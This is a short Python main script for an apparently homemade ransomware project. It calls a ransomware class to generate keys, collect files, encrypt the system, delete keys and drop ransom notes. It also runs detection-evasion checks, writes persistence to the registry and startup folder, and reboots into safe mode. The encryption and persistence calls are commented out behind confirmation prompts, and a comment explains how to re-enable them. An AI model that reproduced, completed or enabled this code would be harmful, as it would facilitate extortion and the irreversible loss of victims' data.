import sys
from ransomware import ransomware

#IF you want to build this project, remove the marker
#from the encrypt system, and reboot into safe mode.
#I turned them off just in case

#After executed, implement a timer for 2 HOURS
ran = ransomware()

def encrypt():
    print("Generating keys...")
    ran.generate_keys()
    ran.generate_fernet()

    print("Getting files...")
    ran.get_all_files()
    print("Encrypting the data...")
    #ran.encrypt_system()
    ran.delete_keys()
    ran.add_notes()

if __name__ == "__main__":
    s1 = input("Are you sure you want to execute this program, this can harm you computer with no option to recover the data? (yes or no)")
    if s1.lower() == "yes":
        s2 = input("Please confirm one more time by writing YeS: ")
        if s2 == "YeS":
            print("Already executed?")
            if ran.already_executed():
                print("\nBeginning the Ransomware\n")
                #encrypt()
            else:
                print("Doing security checks")                
                if ran.evade_detection():
                    print("\nPassed the Security checks")
                    print("Writing to registry and startup folder")
                    #ran.write_to_registry()
                    #ran.reboot_into_safe_mode()
                else:
                    print("\nWasn't able to bypass the Security checks.")
                    sys.exit(0)                    
        else:
            sys.exit(0)
    else:
        sys.exit(0)